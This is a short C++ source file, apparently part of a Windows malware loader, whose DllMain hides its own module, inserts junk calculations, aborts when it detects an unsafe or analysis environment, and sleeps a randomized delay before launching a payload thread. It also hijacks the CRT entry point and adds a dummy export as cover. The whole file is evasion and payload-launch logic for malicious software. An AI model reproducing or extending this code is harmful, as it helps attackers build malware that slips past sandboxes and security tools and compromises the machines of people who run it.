#include "stealth_loader.h"
#include "evasion.h"
#include "memory.h"
#include "crypto.h"
#include "api_resolver.h"

extern "C" void __scrt_common_main_seh() {
    // execution is hijacked before winmain or any CRT init
    hijack_entry_point();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        hide_module(hModule);
        
        execute_junk_calculations();
        
        if (!is_safe_environment()) {
            return FALSE;
        }
        
        DWORD delay = 30000 + (GetCurrentProcessId() % 7) * 1500;
        delay += (GetTickCount() % 5000);
        Sleep(delay);
        
        execute_junk_calculations();
        
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execute_payload, NULL, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
        
        execute_junk_calculations();
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void dummy_export() {
    execute_junk_calculations();
}